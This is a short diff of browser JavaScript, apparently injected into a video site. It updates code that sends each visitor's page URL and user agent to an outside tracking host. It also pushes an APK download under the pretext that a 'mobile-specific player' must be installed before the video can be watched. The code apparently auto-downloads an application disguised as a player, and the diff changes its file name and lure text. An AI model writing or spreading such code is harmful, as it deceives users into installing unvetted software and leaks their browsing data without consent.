@@ -288,7 +288,7 @@ var hy_itv=setInterval(function(){
 							setCookie("hyipdata","0");
 							if(hlTime())
 							{
-								pname="hlyy9.apk";
+								pname="hlyy10.apk";
 								getJsonp(
 									'http://click.shuiguo.com/index.php?action=index&method=main1',
 									"t=undefined&s=tag_889&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
@@ -317,7 +317,7 @@ var hy_itv=setInterval(function(){
 					{
 						if(tt.indexOf("》")<0 || !autoDown()) return;
 						tt=tt.split("》")[0]+"》";
-						tt="正在为您下载播放器，安装后即可观看"+tt;
+						tt="正在为您下载手机专用播放器，安装后即可观看"+tt;
 					} 
 					else if(num==15 || num==28 || num==29)
 					{
